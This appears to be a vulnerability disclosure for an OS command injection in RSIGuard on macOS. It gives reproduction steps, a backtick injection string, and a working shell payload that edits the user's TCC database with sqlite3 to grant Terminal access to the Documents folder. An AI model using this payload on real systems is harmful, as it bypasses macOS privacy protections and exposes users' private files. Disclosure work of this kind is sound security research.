## RSIGuard Stretch Edition v5.1.14.2CM

An OS Command Injection vulnerability exists in RSIGuard for macOS (tested on macOS Monterey 12.6.7) within the KeyControl hotkey configuration functionality.

The vulnerability occurs when configuring a custom hotkey using the "Launch an Application" feature. User supplied input entered into the Program Arguments field is not properly sanitized or validated, allowing arbitrary command execution.

By supplying a malicious payload (e.g., a path to an executable shell script such as /tmp/runme.sh) in the Program Arguments field, an attacker can achieve arbitrary command execution when the configured hotkey is triggered.

RSIGuard requests and operates with Full Disk Access privileges once granted by the user or via MDM policy. Because the vulnerable process runs with these elevated TCC permissions, successful exploitation allows the attacker to:

- Execute arbitrary commands with Full Disk Access context
- Modify the user level macOS Transparency, Consent, and Control (TCC) database
- Grant additional applications access to protected resources such as Documents, Desktop, and other privacy protected directories

This vulnerability enables privilege abuse through trusted application context and may result in unauthorized access to sensitive user data.

## Exploitation Steps
MacOS Monterey 12.6.7 is used for the purposes of this writeup. Since the TCC database schema varies between versions of MacOS, the payload may need to be adjusted for newer versions of MacOS.

Steps to reproduce:
1. Go to `RSIGuard` -> `Settings`
2. Select the `KeyControl` tab, then press the `Add A New Hotkey` button
3. Press any key to select a keybinding
4. For the `Select A Category` dropdown, select the `Launch an Application` option
5. For the `Enter a path to application` option, pick the chess application. Shouldn't matter which application you choose, but this is the one I tested the injection with.
6. Using terminal, create an executable shell script inside of the temp directory named `/tmp/runme.sh`. Payload to use is below, which grants Document read access to terminal, particular but arbitarily chosen:
```
echo FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003 | xxd -r -p > /tmp/csreq.bin;
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "delete from access where service='kTCCServiceSystemPolicyDocumentsFolder' and client='com.apple.Terminal'";
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "INSERT INTO access VALUES('kTCCServiceSystemPolicyDocumentsFolder','com.apple.Terminal',0,2,2,1,readfile('/tmp/csreq.bin'),NULL,0,'UNUSED',NULL,NULL,CAST(strftime('%s','now') AS INTEGER));";
```
7. OS Command Injection vulnerability exists in `Program Arguments` due to lack of input validation for backtick characters. Paste in the following bash command in the `Program Arguments` field: \`/tmp/runme.sh\`.
8. Since the application requests Full Disk Access (end user or MDA software has to grant it), we use the Command Injection to add a TCC entry, which allows us to grant any application on the system TCC permissions such as document folder or desktop read access. Click okay for the two prompts, then press keybinding key you selected earlier to trigger attack.

## Additional Information
This attack is not limited to the GUI application. The currently logged in user can modify the `~/Library/Preferences/RSIGuard Preferences` file in order to conduct this attack via command line. This requires no special TCC permissions and just an execution context as the current user. Based on testing, it does require that the RSIGuard application to not be running, otherwise the runtime application will override any changes to the configuration file.
